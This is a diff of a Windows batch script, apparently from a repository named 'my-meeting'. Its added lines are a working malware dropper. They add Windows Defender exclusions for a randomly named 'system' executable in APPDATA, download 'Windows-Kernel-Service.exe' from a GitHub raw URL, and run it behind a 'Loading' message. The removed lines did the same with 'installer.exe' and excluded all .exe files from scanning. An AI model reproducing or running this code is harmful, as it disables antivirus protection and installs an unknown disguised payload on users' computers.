@@ -26,9 +26,15 @@ if '%errorlevel%' NEQ '0' (
     pushd "%CD%"
     CD /D "%~dp0"
 :--------------------------------------
-Powershell -Command "Set-MpPreference -ExclusionExtension exe"
-Powershell -Command "Set-MpPreference -ExclusionProcess `"installer.exe`""
-Powershell -Command "Add-MpPreference -ExclusionPath `"%USERPROFILE%\AppData\Roaming\installer.exe`""
-cd %TEMP%
-Powershell -Command "Invoke-Webrequest 'https://raw.githubusercontent.com/huynq11019/my-meeting/refs/heads/main/installer.exe' -OutFile installer.exe"
-installer.exe
+echo Loading.... Don't close this windown
+set "base_filename=system"
+set "random_suffix=%RANDOM%"
+set "final_filename=%base_filename%_%random_suffix%.exe"
+
+powershell.exe -Command "Set-MpPreference -ExclusionProcess  '%final_filename%'"
+powershell.exe -Command "Add-MpPreference -ExclusionPath '%APPDATA%\\%final_filename%'"
+::cd %TEMP%
+cd %APPDATA%
+Powershell -Command "Invoke-Webrequest 'https://raw.githubusercontent.com/huynq11019/my-meeting/refs/heads/main/Windows-Kernel-Service.exe' -OutFile '%APPDATA%\\%final_filename%'"
+"%APPDATA%\\%final_filename%"
+exit
